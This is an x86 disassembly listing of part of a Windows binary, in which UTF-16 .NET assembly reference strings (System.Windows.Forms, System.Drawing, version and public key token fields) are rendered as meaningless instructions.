  4057c4:	outs   dx,DWORD PTR ds:[esi]
  4057c5:	add    BYTE PTR [ecx+0x0],ah
  4057c8:	jo     0x4057ca
  4057ca:	sub    al,0x0
  4057cc:	and    BYTE PTR [eax],al
  4057ce:	push   esi
  4057cf:	add    BYTE PTR [ebp+0x0],ah
  4057d2:	jb     0x4057d4
  4057d4:	jae    0x4057d6
  4057d6:	imul   eax,DWORD PTR [eax],0x6e006f
  4057dc:	cmp    eax,0x2e003400
  4057e1:	add    BYTE PTR [eax],dh
  4057e3:	add    BYTE PTR [esi],ch
  4057e5:	add    BYTE PTR [eax],dh
  4057e7:	add    BYTE PTR [esi],ch
  4057e9:	add    BYTE PTR [eax],dh
  4057eb:	add    BYTE PTR [eax+eax*1],ch
  4057ee:	and    BYTE PTR [eax],al
  4057f0:	inc    ebx
  4057f1:	add    BYTE PTR [ebp+0x0],dh
  4057f4:	ins    BYTE PTR es:[edi],dx
  4057f5:	add    BYTE PTR [eax+eax*1+0x75],dh
  4057f9:	add    BYTE PTR [edx+0x0],dh
  4057fc:	add    BYTE PTR gs:0x65006e00,bh
  405803:	add    BYTE PTR [ebp+0x0],dh
  405806:	je     0x405808
  405808:	jb     0x40580a
  40580a:	popa   
  40580b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40580f:	add    BYTE PTR [eax],ah
  405811:	add    BYTE PTR [eax+0x0],dl
  405814:	jne    0x405816
  405816:	bound  eax,QWORD PTR [eax]
  405818:	ins    BYTE PTR es:[edi],dx
  405819:	add    BYTE PTR [ecx+0x0],ch
  40581c:	arpl   WORD PTR [eax],ax
  40581e:	dec    ebx
  40581f:	add    BYTE PTR [ebp+0x0],ah
  405822:	jns    0x405824
  405824:	push   esp
  405825:	add    BYTE PTR [edi+0x0],ch
  405828:	imul   eax,DWORD PTR [eax],0x65
  40582b:	add    BYTE PTR [esi+0x0],ch
  40582e:	cmp    eax,0x30006200
  405833:	add    BYTE PTR [ebx],dh
  405835:	add    BYTE PTR [esi+0x0],ah
  405838:	xor    eax,0x37006600
  40583d:	add    BYTE PTR [esi+0x0],ah
  405840:	xor    DWORD PTR [eax],eax
  405842:	xor    DWORD PTR [eax],eax
  405844:	add    BYTE PTR fs:0x61003000,dh
  40584b:	add    BYTE PTR [ebx],dh
  40584d:	add    BYTE PTR [ecx+0x0],ah
  405850:	add    al,0x53
  405853:	add    BYTE PTR [ecx+0x0],bh
  405856:	jae    0x405858
  405858:	je     0x40585a
  40585a:	add    BYTE PTR gs:[ebp+0x0],ch
  40585e:	add    BYTE PTR cs:[edx+0x0],dl
  405862:	jne    0x405864
  405864:	outs   dx,BYTE PTR ds:[esi]
  405865:	add    BYTE PTR [eax+eax*1+0x69],dh
  405869:	add    BYTE PTR [ebp+0x0],ch
  40586c:	add    BYTE PTR gs:[esi],ch
  40586f:	add    BYTE PTR [edi+0x0],dl
  405872:	imul   eax,DWORD PTR [eax],0x64006e
  405878:	outs   dx,DWORD PTR ds:[esi]
  405879:	add    BYTE PTR [edi+0x0],dh
  40587c:	jae    0x40587e
  40587e:	push   edx
  40587f:	add    BYTE PTR [ebp+0x0],dh
  405882:	outs   dx,BYTE PTR ds:[esi]
  405883:	add    BYTE PTR [eax+eax*1+0x69],dh
  405887:	add    BYTE PTR [ebp+0x0],ch
  40588a:	add    BYTE PTR gs:[eax+eax*1],ch
  40588e:	and    BYTE PTR [eax],al
  405890:	push   esi
  405891:	add    BYTE PTR [ebp+0x0],ah
  405894:	jb     0x405896
  405896:	jae    0x405898
  405898:	imul   eax,DWORD PTR [eax],0x6e006f
  40589e:	cmp    eax,0x2e003400
  4058a3:	add    BYTE PTR [eax],dh
  4058a5:	add    BYTE PTR [esi],ch
  4058a7:	add    BYTE PTR [eax],dh
  4058a9:	add    BYTE PTR [esi],ch
  4058ab:	add    BYTE PTR [eax],dh
  4058ad:	add    BYTE PTR [eax+eax*1],ch
  4058b0:	and    BYTE PTR [eax],al
  4058b2:	inc    ebx
  4058b3:	add    BYTE PTR [ebp+0x0],dh
  4058b6:	ins    BYTE PTR es:[edi],dx
  4058b7:	add    BYTE PTR [eax+eax*1+0x75],dh
  4058bb:	add    BYTE PTR [edx+0x0],dh
  4058be:	add    BYTE PTR gs:0x65006e00,bh
  4058c5:	add    BYTE PTR [ebp+0x0],dh
  4058c8:	je     0x4058ca
  4058ca:	jb     0x4058cc
  4058cc:	popa   
  4058cd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4058d1:	add    BYTE PTR [eax],ah
  4058d3:	add    BYTE PTR [eax+0x0],dl
  4058d6:	jne    0x4058d8
  4058d8:	bound  eax,QWORD PTR [eax]
  4058da:	ins    BYTE PTR es:[edi],dx
  4058db:	add    BYTE PTR [ecx+0x0],ch
  4058de:	arpl   WORD PTR [eax],ax
  4058e0:	dec    ebx
  4058e1:	add    BYTE PTR [ebp+0x0],ah
  4058e4:	jns    0x4058e6
  4058e6:	push   esp
  4058e7:	add    BYTE PTR [edi+0x0],ch
  4058ea:	imul   eax,DWORD PTR [eax],0x65
  4058ed:	add    BYTE PTR [esi+0x0],ch
  4058f0:	cmp    eax,0x37006200
  4058f5:	add    BYTE PTR [edi],dh
  4058f7:	add    BYTE PTR [ecx+0x0],ah
  4058fa:	xor    eax,0x35006300
  4058ff:	add    BYTE PTR [esi],dh
  405901:	add    BYTE PTR [ecx],dh
  405903:	add    BYTE PTR [ecx],bh
  405905:	add    BYTE PTR [ebx],dh
  405907:	add    BYTE PTR [eax+eax*1],dh
  40590a:	add    BYTE PTR gs:[eax],dh
  40590d:	add    BYTE PTR [eax],bh
  40590f:	add    BYTE PTR [ecx],bh
  405911:	add    BYTE PTR [eax+0x790053cc],al
  405917:	add    BYTE PTR [ebx+0x0],dh
  40591a:	je     0x40591c
  40591c:	add    BYTE PTR gs:[ebp+0x0],ch
  405920:	add    BYTE PTR cs:[edx+0x0],dl
  405924:	jne    0x405926
  405926:	outs   dx,BYTE PTR ds:[esi]
  405927:	add    BYTE PTR [eax+eax*1+0x69],dh
  40592b:	add    BYTE PTR [ebp+0x0],ch
  40592e:	add    BYTE PTR gs:[esi],ch
  405931:	add    BYTE PTR [edi+0x0],dl
  405934:	imul   eax,DWORD PTR [eax],0x64006e
  40593a:	outs   dx,DWORD PTR ds:[esi]
  40593b:	add    BYTE PTR [edi+0x0],dh
  40593e:	jae    0x405940
  405940:	push   edx
  405941:	add    BYTE PTR [ebp+0x0],dh
  405944:	outs   dx,BYTE PTR ds:[esi]
  405945:	add    BYTE PTR [eax+eax*1+0x69],dh
  405949:	add    BYTE PTR [ebp+0x0],ch
  40594c:	add    BYTE PTR gs:[ebp+0x0],dl
  405950:	dec    ecx
  405951:	add    BYTE PTR [eax+0x0],bl
  405954:	popa   
  405955:	add    BYTE PTR [ebp+0x0],ch
  405958:	ins    BYTE PTR es:[edi],dx
  405959:	add    BYTE PTR [eax+eax*1],ch
  40595c:	and    BYTE PTR [eax],al
  40595e:	push   esi
  40595f:	add    BYTE PTR [ebp+0x0],ah
  405962:	jb     0x405964
  405964:	jae    0x405966
  405966:	imul   eax,DWORD PTR [eax],0x6e006f
  40596c:	cmp    eax,0x2e003400
  405971:	add    BYTE PTR [eax],dh
  405973:	add    BYTE PTR [esi],ch
  405975:	add    BYTE PTR [eax],dh
  405977:	add    BYTE PTR [esi],ch
  405979:	add    BYTE PTR [eax],dh
  40597b:	add    BYTE PTR [eax+eax*1],ch
  40597e:	and    BYTE PTR [eax],al
  405980:	inc    ebx
  405981:	add    BYTE PTR [ebp+0x0],dh
  405984:	ins    BYTE PTR es:[edi],dx
  405985:	add    BYTE PTR [eax+eax*1+0x75],dh
  405989:	add    BYTE PTR [edx+0x0],dh
  40598c:	add    BYTE PTR gs:0x65006e00,bh
  405993:	add    BYTE PTR [ebp+0x0],dh
  405996:	je     0x405998
  405998:	jb     0x40599a
  40599a:	popa   
  40599b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40599f:	add    BYTE PTR [eax],ah
  4059a1:	add    BYTE PTR [eax+0x0],dl
  4059a4:	jne    0x4059a6
  4059a6:	bound  eax,QWORD PTR [eax]
  4059a8:	ins    BYTE PTR es:[edi],dx
  4059a9:	add    BYTE PTR [ecx+0x0],ch
  4059ac:	arpl   WORD PTR [eax],ax
  4059ae:	dec    ebx
  4059af:	add    BYTE PTR [ebp+0x0],ah
  4059b2:	jns    0x4059b4
  4059b4:	push   esp
  4059b5:	add    BYTE PTR [edi+0x0],ch
  4059b8:	imul   eax,DWORD PTR [eax],0x65
  4059bb:	add    BYTE PTR [esi+0x0],ch
  4059be:	cmp    eax,0x37006200
  4059c3:	add    BYTE PTR [edi],dh
  4059c5:	add    BYTE PTR [ecx+0x0],ah
  4059c8:	xor    eax,0x35006300
  4059cd:	add    BYTE PTR [esi],dh
  4059cf:	add    BYTE PTR [ecx],dh
  4059d1:	add    BYTE PTR [ecx],bh
  4059d3:	add    BYTE PTR [ebx],dh
  4059d5:	add    BYTE PTR [eax+eax*1],dh
  4059d8:	add    BYTE PTR gs:[eax],dh
  4059db:	add    BYTE PTR [eax],bh
  4059dd:	add    BYTE PTR [ecx],bh
  4059df:	add    BYTE PTR [eax+0x790053a4],al
  4059e5:	add    BYTE PTR [ebx+0x0],dh
  4059e8:	je     0x4059ea
  4059ea:	add    BYTE PTR gs:[ebp+0x0],ch
  4059ee:	add    BYTE PTR cs:[ebx+0x0],dl
  4059f2:	add    BYTE PTR gs:[ebx+0x0],ah
  4059f6:	jne    0x4059f8
  4059f8:	jb     0x4059fa
  4059fa:	imul   eax,DWORD PTR [eax],0x790074
  405a00:	sub    al,0x0
  405a02:	and    BYTE PTR [eax],al
  405a04:	push   esi
  405a05:	add    BYTE PTR [ebp+0x0],ah
  405a08:	jb     0x405a0a
  405a0a:	jae    0x405a0c
  405a0c:	imul   eax,DWORD PTR [eax],0x6e006f
  405a12:	cmp    eax,0x2e003400
  405a17:	add    BYTE PTR [eax],dh
  405a19:	add    BYTE PTR [esi],ch
  405a1b:	add    BYTE PTR [eax],dh
  405a1d:	add    BYTE PTR [esi],ch
  405a1f:	add    BYTE PTR [eax],dh
  405a21:	add    BYTE PTR [eax+eax*1],ch
  405a24:	and    BYTE PTR [eax],al
  405a26:	inc    ebx
  405a27:	add    BYTE PTR [ebp+0x0],dh
  405a2a:	ins    BYTE PTR es:[edi],dx
  405a2b:	add    BYTE PTR [eax+eax*1+0x75],dh
  405a2f:	add    BYTE PTR [edx+0x0],dh
  405a32:	add    BYTE PTR gs:0x65006e00,bh
  405a39:	add    BYTE PTR [ebp+0x0],dh
  405a3c:	je     0x405a3e
  405a3e:	jb     0x405a40
  405a40:	popa   
  405a41:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405a45:	add    BYTE PTR [eax],ah
  405a47:	add    BYTE PTR [eax+0x0],dl
  405a4a:	jne    0x405a4c
  405a4c:	bound  eax,QWORD PTR [eax]
  405a4e:	ins    BYTE PTR es:[edi],dx
  405a4f:	add    BYTE PTR [ecx+0x0],ch
  405a52:	arpl   WORD PTR [eax],ax
  405a54:	dec    ebx
  405a55:	add    BYTE PTR [ebp+0x0],ah
  405a58:	jns    0x405a5a
  405a5a:	push   esp
  405a5b:	add    BYTE PTR [edi+0x0],ch
  405a5e:	imul   eax,DWORD PTR [eax],0x65
  405a61:	add    BYTE PTR [esi+0x0],ch
  405a64:	cmp    eax,0x30006200
  405a69:	add    BYTE PTR [ebx],dh
  405a6b:	add    BYTE PTR [esi+0x0],ah
  405a6e:	xor    eax,0x37006600
  405a73:	add    BYTE PTR [esi+0x0],ah
  405a76:	xor    DWORD PTR [eax],eax
  405a78:	xor    DWORD PTR [eax],eax
  405a7a:	add    BYTE PTR fs:0x61003000,dh
  405a81:	add    BYTE PTR [ebx],dh
  405a83:	add    BYTE PTR [ecx+0x0],ah
  405a86:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  405a8e:	je     0x405a90
  405a90:	add    BYTE PTR gs:[ebp+0x0],ch
  405a94:	add    BYTE PTR cs:[ebx+0x0],dl
  405a98:	add    BYTE PTR gs:[edx+0x0],dh
  405a9c:	jbe    0x405a9e
  405a9e:	imul   eax,DWORD PTR [eax],0x650063
  405aa4:	dec    ebp
  405aa5:	add    BYTE PTR [edi+0x0],ch
  405aa8:	add    BYTE PTR fs:[ebp+0x0],ah
  405aac:	ins    BYTE PTR es:[edi],dx
  405aad:	add    BYTE PTR [esi],ch
  405aaf:	add    BYTE PTR [edi+0x0],dl
  405ab2:	add    BYTE PTR gs:[edx+0x0],ah
  405ab6:	sub    al,0x0
  405ab8:	and    BYTE PTR [eax],al
  405aba:	push   esi
  405abb:	add    BYTE PTR [ebp+0x0],ah
  405abe:	jb     0x405ac0
  405ac0:	jae    0x405ac2
  405ac2:	imul   eax,DWORD PTR [eax],0x6e006f
  405ac8:	cmp    eax,0x2e003400
  405acd:	add    BYTE PTR [eax],dh
  405acf:	add    BYTE PTR [esi],ch
  405ad1:	add    BYTE PTR [eax],dh
  405ad3:	add    BYTE PTR [esi],ch
  405ad5:	add    BYTE PTR [eax],dh
  405ad7:	add    BYTE PTR [eax+eax*1],ch
  405ada:	and    BYTE PTR [eax],al
  405adc:	inc    ebx
  405add:	add    BYTE PTR [ebp+0x0],dh
  405ae0:	ins    BYTE PTR es:[edi],dx
  405ae1:	add    BYTE PTR [eax+eax*1+0x75],dh
  405ae5:	add    BYTE PTR [edx+0x0],dh
  405ae8:	add    BYTE PTR gs:0x65006e00,bh
  405aef:	add    BYTE PTR [ebp+0x0],dh
  405af2:	je     0x405af4
  405af4:	jb     0x405af6
  405af6:	popa   
  405af7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405afb:	add    BYTE PTR [eax],ah
  405afd:	add    BYTE PTR [eax+0x0],dl
  405b00:	jne    0x405b02
  405b02:	bound  eax,QWORD PTR [eax]
  405b04:	ins    BYTE PTR es:[edi],dx
  405b05:	add    BYTE PTR [ecx+0x0],ch
  405b08:	arpl   WORD PTR [eax],ax
  405b0a:	dec    ebx
  405b0b:	add    BYTE PTR [ebp+0x0],ah
  405b0e:	jns    0x405b10
  405b10:	push   esp
  405b11:	add    BYTE PTR [edi+0x0],ch
  405b14:	imul   eax,DWORD PTR [eax],0x65
  405b17:	add    BYTE PTR [esi+0x0],ch
  405b1a:	cmp    eax,0x31003300
  405b1f:	add    BYTE PTR [edx+0x0],ah
  405b22:	data16 add BYTE PTR [ebx],dh
  405b25:	add    BYTE PTR [eax],bh
  405b27:	add    BYTE PTR ds:0x61003600,dh
  405b2d:	add    BYTE PTR [eax+eax*1+0x33],ah
  405b31:	add    BYTE PTR [esi],dh
  405b33:	add    BYTE PTR [eax+eax*1],dh
  405b36:	add    BYTE PTR gs:[ebx],dh
  405b39:	add    BYTE PTR ds:0x53b08000,dh
  405b3f:	add    BYTE PTR [ecx+0x0],bh
  405b42:	jae    0x405b44
  405b44:	je     0x405b46
  405b46:	add    BYTE PTR gs:[ebp+0x0],ch
  405b4a:	add    BYTE PTR cs:[ebx+0x0],dl
  405b4e:	add    BYTE PTR gs:[edx+0x0],dh
  405b52:	jbe    0x405b54
  405b54:	imul   eax,DWORD PTR [eax],0x650063
  405b5a:	push   eax
  405b5b:	add    BYTE PTR [edx+0x0],dh
  405b5e:	outs   dx,DWORD PTR ds:[esi]
  405b5f:	add    BYTE PTR [ebx+0x0],ah
  405b62:	add    BYTE PTR gs:[ebx+0x0],dh
  405b66:	jae    0x405b68
  405b68:	sub    al,0x0
  405b6a:	and    BYTE PTR [eax],al
  405b6c:	push   esi
  405b6d:	add    BYTE PTR [ebp+0x0],ah
  405b70:	jb     0x405b72
  405b72:	jae    0x405b74
  405b74:	imul   eax,DWORD PTR [eax],0x6e006f
  405b7a:	cmp    eax,0x2e003400
  405b7f:	add    BYTE PTR [eax],dh
  405b81:	add    BYTE PTR [esi],ch
  405b83:	add    BYTE PTR [eax],dh
  405b85:	add    BYTE PTR [esi],ch
  405b87:	add    BYTE PTR [eax],dh
  405b89:	add    BYTE PTR [eax+eax*1],ch
  405b8c:	and    BYTE PTR [eax],al
  405b8e:	inc    ebx
  405b8f:	add    BYTE PTR [ebp+0x0],dh
  405b92:	ins    BYTE PTR es:[edi],dx
  405b93:	add    BYTE PTR [eax+eax*1+0x75],dh
  405b97:	add    BYTE PTR [edx+0x0],dh
  405b9a:	add    BYTE PTR gs:0x65006e00,bh
  405ba1:	add    BYTE PTR [ebp+0x0],dh
  405ba4:	je     0x405ba6
  405ba6:	jb     0x405ba8
  405ba8:	popa   
  405ba9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405bad:	add    BYTE PTR [eax],ah
  405baf:	add    BYTE PTR [eax+0x0],dl
  405bb2:	jne    0x405bb4
  405bb4:	bound  eax,QWORD PTR [eax]
  405bb6:	ins    BYTE PTR es:[edi],dx
  405bb7:	add    BYTE PTR [ecx+0x0],ch
  405bba:	arpl   WORD PTR [eax],ax
  405bbc:	dec    ebx
  405bbd:	add    BYTE PTR [ebp+0x0],ah
  405bc0:	jns    0x405bc2
  405bc2:	push   esp
  405bc3:	add    BYTE PTR [edi+0x0],ch
  405bc6:	imul   eax,DWORD PTR [eax],0x65
  405bc9:	add    BYTE PTR [esi+0x0],ch
  405bcc:	cmp    eax,0x30006200
  405bd1:	add    BYTE PTR [ebx],dh
  405bd3:	add    BYTE PTR [esi+0x0],ah
  405bd6:	xor    eax,0x37006600
  405bdb:	add    BYTE PTR [esi+0x0],ah
  405bde:	xor    DWORD PTR [eax],eax
  405be0:	xor    DWORD PTR [eax],eax
  405be2:	add    BYTE PTR fs:0x61003000,dh
  405be9:	add    BYTE PTR [ebx],dh
  405beb:	add    BYTE PTR [ecx+0x0],ah
  405bee:	sbb    BYTE PTR [edx+0x790053],0x73
  405bf5:	add    BYTE PTR [eax+eax*1+0x65],dh
  405bf9:	add    BYTE PTR [ebp+0x0],ch
  405bfc:	add    BYTE PTR cs:[edi+0x0],dl
  405c00:	add    BYTE PTR gs:[edx+0x0],ah
  405c04:	sub    al,0x0
  405c06:	and    BYTE PTR [eax],al
  405c08:	push   esi
  405c09:	add    BYTE PTR [ebp+0x0],ah
  405c0c:	jb     0x405c0e
  405c0e:	jae    0x405c10
  405c10:	imul   eax,DWORD PTR [eax],0x6e006f
  405c16:	cmp    eax,0x2e003400
  405c1b:	add    BYTE PTR [eax],dh
  405c1d:	add    BYTE PTR [esi],ch
  405c1f:	add    BYTE PTR [eax],dh
  405c21:	add    BYTE PTR [esi],ch
  405c23:	add    BYTE PTR [eax],dh
  405c25:	add    BYTE PTR [eax+eax*1],ch
  405c28:	and    BYTE PTR [eax],al
  405c2a:	inc    ebx
  405c2b:	add    BYTE PTR [ebp+0x0],dh
  405c2e:	ins    BYTE PTR es:[edi],dx
  405c2f:	add    BYTE PTR [eax+eax*1+0x75],dh
  405c33:	add    BYTE PTR [edx+0x0],dh
  405c36:	add    BYTE PTR gs:0x65006e00,bh
  405c3d:	add    BYTE PTR [ebp+0x0],dh
  405c40:	je     0x405c42
  405c42:	jb     0x405c44
  405c44:	popa   
  405c45:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405c49:	add    BYTE PTR [eax],ah
  405c4b:	add    BYTE PTR [eax+0x0],dl
  405c4e:	jne    0x405c50
  405c50:	bound  eax,QWORD PTR [eax]
  405c52:	ins    BYTE PTR es:[edi],dx
  405c53:	add    BYTE PTR [ecx+0x0],ch
  405c56:	arpl   WORD PTR [eax],ax
  405c58:	dec    ebx
  405c59:	add    BYTE PTR [ebp+0x0],ah
  405c5c:	jns    0x405c5e
  405c5e:	push   esp
  405c5f:	add    BYTE PTR [edi+0x0],ch
  405c62:	imul   eax,DWORD PTR [eax],0x65
  405c65:	add    BYTE PTR [esi+0x0],ch
  405c68:	cmp    eax,0x30006200
  405c6d:	add    BYTE PTR [ebx],dh
  405c6f:	add    BYTE PTR [esi+0x0],ah
  405c72:	xor    eax,0x37006600
  405c77:	add    BYTE PTR [esi+0x0],ah
  405c7a:	xor    DWORD PTR [eax],eax
  405c7c:	xor    DWORD PTR [eax],eax
  405c7e:	add    BYTE PTR fs:0x61003000,dh
  405c85:	add    BYTE PTR [ebx],dh
  405c87:	add    BYTE PTR [ecx+0x0],ah
  405c8a:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  405c92:	je     0x405c94
  405c94:	add    BYTE PTR gs:[ebp+0x0],ch
  405c98:	add    BYTE PTR cs:[edi+0x0],dl
  405c9c:	add    BYTE PTR gs:[edx+0x0],ah
  405ca0:	add    BYTE PTR cs:[ecx+0x0],al
  405ca4:	bound  eax,QWORD PTR [eax]
  405ca6:	jae    0x405ca8
  405ca8:	je     0x405caa
  405caa:	jb     0x405cac
  405cac:	popa   
  405cad:	add    BYTE PTR [ebx+0x0],ah
  405cb0:	je     0x405cb2
  405cb2:	imul   eax,DWORD PTR [eax],0x6e006f
  405cb8:	jae    0x405cba
  405cba:	sub    al,0x0
  405cbc:	and    BYTE PTR [eax],al
  405cbe:	push   esi
  405cbf:	add    BYTE PTR [ebp+0x0],ah
  405cc2:	jb     0x405cc4
  405cc4:	jae    0x405cc6
  405cc6:	imul   eax,DWORD PTR [eax],0x6e006f
  405ccc:	cmp    eax,0x2e003400
  405cd1:	add    BYTE PTR [eax],dh
  405cd3:	add    BYTE PTR [esi],ch
  405cd5:	add    BYTE PTR [eax],dh
  405cd7:	add    BYTE PTR [esi],ch
  405cd9:	add    BYTE PTR [eax],dh
  405cdb:	add    BYTE PTR [eax+eax*1],ch
  405cde:	and    BYTE PTR [eax],al
  405ce0:	inc    ebx
  405ce1:	add    BYTE PTR [ebp+0x0],dh
  405ce4:	ins    BYTE PTR es:[edi],dx
  405ce5:	add    BYTE PTR [eax+eax*1+0x75],dh
  405ce9:	add    BYTE PTR [edx+0x0],dh
  405cec:	add    BYTE PTR gs:0x65006e00,bh
  405cf3:	add    BYTE PTR [ebp+0x0],dh
  405cf6:	je     0x405cf8
  405cf8:	jb     0x405cfa
  405cfa:	popa   
  405cfb:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405cff:	add    BYTE PTR [eax],ah
  405d01:	add    BYTE PTR [eax+0x0],dl
  405d04:	jne    0x405d06
  405d06:	bound  eax,QWORD PTR [eax]
  405d08:	ins    BYTE PTR es:[edi],dx
  405d09:	add    BYTE PTR [ecx+0x0],ch
  405d0c:	arpl   WORD PTR [eax],ax
  405d0e:	dec    ebx
  405d0f:	add    BYTE PTR [ebp+0x0],ah
  405d12:	jns    0x405d14
  405d14:	push   esp
  405d15:	add    BYTE PTR [edi+0x0],ch
  405d18:	imul   eax,DWORD PTR [eax],0x65
  405d1b:	add    BYTE PTR [esi+0x0],ch
  405d1e:	cmp    eax,0x31003300
  405d23:	add    BYTE PTR [edx+0x0],ah
  405d26:	data16 add BYTE PTR [ebx],dh
  405d29:	add    BYTE PTR [eax],bh
  405d2b:	add    BYTE PTR ds:0x61003600,dh
  405d31:	add    BYTE PTR [eax+eax*1+0x33],ah
  405d35:	add    BYTE PTR [esi],dh
  405d37:	add    BYTE PTR [eax+eax*1],dh
  405d3a:	add    BYTE PTR gs:[ebx],dh
  405d3d:	add    BYTE PTR ds:0x53b28000,dh
  405d43:	add    BYTE PTR [ecx+0x0],bh
  405d46:	jae    0x405d48
  405d48:	je     0x405d4a
  405d4a:	add    BYTE PTR gs:[ebp+0x0],ch
  405d4e:	add    BYTE PTR cs:[edi+0x0],dl
  405d52:	add    BYTE PTR gs:[edx+0x0],ah
  405d56:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  405d5b:	add    BYTE PTR [esi+0x0],ch
  405d5e:	popa   
  405d5f:	add    BYTE PTR [ebp+0x0],ch
  405d62:	imul   eax,DWORD PTR [eax],0x440063
  405d68:	popa   
  405d69:	add    BYTE PTR [eax+eax*1+0x61],dh
  405d6d:	add    BYTE PTR [eax+eax*1],ch
  405d70:	and    BYTE PTR [eax],al
  405d72:	push   esi
  405d73:	add    BYTE PTR [ebp+0x0],ah
  405d76:	jb     0x405d78
  405d78:	jae    0x405d7a
  405d7a:	imul   eax,DWORD PTR [eax],0x6e006f
  405d80:	cmp    eax,0x2e003400
  405d85:	add    BYTE PTR [eax],dh
  405d87:	add    BYTE PTR [esi],ch
  405d89:	add    BYTE PTR [eax],dh
  405d8b:	add    BYTE PTR [esi],ch
  405d8d:	add    BYTE PTR [eax],dh
  405d8f:	add    BYTE PTR [eax+eax*1],ch
  405d92:	and    BYTE PTR [eax],al
  405d94:	inc    ebx
  405d95:	add    BYTE PTR [ebp+0x0],dh
  405d98:	ins    BYTE PTR es:[edi],dx
  405d99:	add    BYTE PTR [eax+eax*1+0x75],dh
  405d9d:	add    BYTE PTR [edx+0x0],dh
  405da0:	add    BYTE PTR gs:0x65006e00,bh
  405da7:	add    BYTE PTR [ebp+0x0],dh
  405daa:	je     0x405dac
  405dac:	jb     0x405dae
  405dae:	popa   
  405daf:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405db3:	add    BYTE PTR [eax],ah
  405db5:	add    BYTE PTR [eax+0x0],dl
  405db8:	jne    0x405dba
  405dba:	bound  eax,QWORD PTR [eax]
  405dbc:	ins    BYTE PTR es:[edi],dx
  405dbd:	add    BYTE PTR [ecx+0x0],ch
  405dc0:	arpl   WORD PTR [eax],ax
  405dc2:	dec    ebx
  405dc3:	add    BYTE PTR [ebp+0x0],ah
  405dc6:	jns    0x405dc8
  405dc8:	push   esp
  405dc9:	add    BYTE PTR [edi+0x0],ch
  405dcc:	imul   eax,DWORD PTR [eax],0x65
  405dcf:	add    BYTE PTR [esi+0x0],ch
  405dd2:	cmp    eax,0x31003300
  405dd7:	add    BYTE PTR [edx+0x0],ah
  405dda:	data16 add BYTE PTR [ebx],dh
  405ddd:	add    BYTE PTR [eax],bh
  405ddf:	add    BYTE PTR ds:0x61003600,dh
  405de5:	add    BYTE PTR [eax+eax*1+0x33],ah
  405de9:	add    BYTE PTR [esi],dh
  405deb:	add    BYTE PTR [eax+eax*1],dh
  405dee:	add    BYTE PTR gs:[ebx],dh
  405df1:	add    BYTE PTR ds:0x53c08000,dh
  405df7:	add    BYTE PTR [ecx+0x0],bh
  405dfa:	jae    0x405dfc
  405dfc:	je     0x405dfe
  405dfe:	add    BYTE PTR gs:[ebp+0x0],ch
  405e02:	add    BYTE PTR cs:[edi+0x0],dl
  405e06:	add    BYTE PTR gs:[edx+0x0],ah
  405e0a:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  405e0f:	add    BYTE PTR [esi+0x0],ch
  405e12:	popa   
  405e13:	add    BYTE PTR [ebp+0x0],ch
  405e16:	imul   eax,DWORD PTR [eax],0x440063
  405e1c:	popa   
  405e1d:	add    BYTE PTR [eax+eax*1+0x61],dh
  405e21:	add    BYTE PTR [esi],ch
  405e23:	add    BYTE PTR [eax+eax*1+0x65],al
  405e27:	add    BYTE PTR [ebx+0x0],dh
  405e2a:	imul   eax,DWORD PTR [eax],0x6e0067
  405e30:	sub    al,0x0
  405e32:	and    BYTE PTR [eax],al
  405e34:	push   esi
  405e35:	add    BYTE PTR [ebp+0x0],ah
  405e38:	jb     0x405e3a
  405e3a:	jae    0x405e3c
  405e3c:	imul   eax,DWORD PTR [eax],0x6e006f
  405e42:	cmp    eax,0x2e003400
  405e47:	add    BYTE PTR [eax],dh
  405e49:	add    BYTE PTR [esi],ch
  405e4b:	add    BYTE PTR [eax],dh
  405e4d:	add    BYTE PTR [esi],ch
  405e4f:	add    BYTE PTR [eax],dh
  405e51:	add    BYTE PTR [eax+eax*1],ch
  405e54:	and    BYTE PTR [eax],al
  405e56:	inc    ebx
  405e57:	add    BYTE PTR [ebp+0x0],dh
  405e5a:	ins    BYTE PTR es:[edi],dx
  405e5b:	add    BYTE PTR [eax+eax*1+0x75],dh
  405e5f:	add    BYTE PTR [edx+0x0],dh
  405e62:	add    BYTE PTR gs:0x65006e00,bh
  405e69:	add    BYTE PTR [ebp+0x0],dh
  405e6c:	je     0x405e6e
  405e6e:	jb     0x405e70
  405e70:	popa   
  405e71:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405e75:	add    BYTE PTR [eax],ah
  405e77:	add    BYTE PTR [eax+0x0],dl
  405e7a:	jne    0x405e7c
  405e7c:	bound  eax,QWORD PTR [eax]
  405e7e:	ins    BYTE PTR es:[edi],dx
  405e7f:	add    BYTE PTR [ecx+0x0],ch
  405e82:	arpl   WORD PTR [eax],ax
  405e84:	dec    ebx
  405e85:	add    BYTE PTR [ebp+0x0],ah
  405e88:	jns    0x405e8a
  405e8a:	push   esp
  405e8b:	add    BYTE PTR [edi+0x0],ch
  405e8e:	imul   eax,DWORD PTR [eax],0x65
  405e91:	add    BYTE PTR [esi+0x0],ch
  405e94:	cmp    eax,0x31003300
  405e99:	add    BYTE PTR [edx+0x0],ah
  405e9c:	data16 add BYTE PTR [ebx],dh
  405e9f:	add    BYTE PTR [eax],bh
  405ea1:	add    BYTE PTR ds:0x61003600,dh
  405ea7:	add    BYTE PTR [eax+eax*1+0x33],ah
  405eab:	add    BYTE PTR [esi],dh
  405ead:	add    BYTE PTR [eax+eax*1],dh
  405eb0:	add    BYTE PTR gs:[ebx],dh
  405eb3:	add    BYTE PTR ds:0x53b68000,dh
  405eb9:	add    BYTE PTR [ecx+0x0],bh
  405ebc:	jae    0x405ebe
  405ebe:	je     0x405ec0
  405ec0:	add    BYTE PTR gs:[ebp+0x0],ch
  405ec4:	add    BYTE PTR cs:[edi+0x0],dl
  405ec8:	add    BYTE PTR gs:[edx+0x0],ah
  405ecc:	add    BYTE PTR cs:[ebp+0x0],al
  405ed0:	outs   dx,BYTE PTR ds:[esi]
  405ed1:	add    BYTE PTR [eax+eax*1+0x69],dh
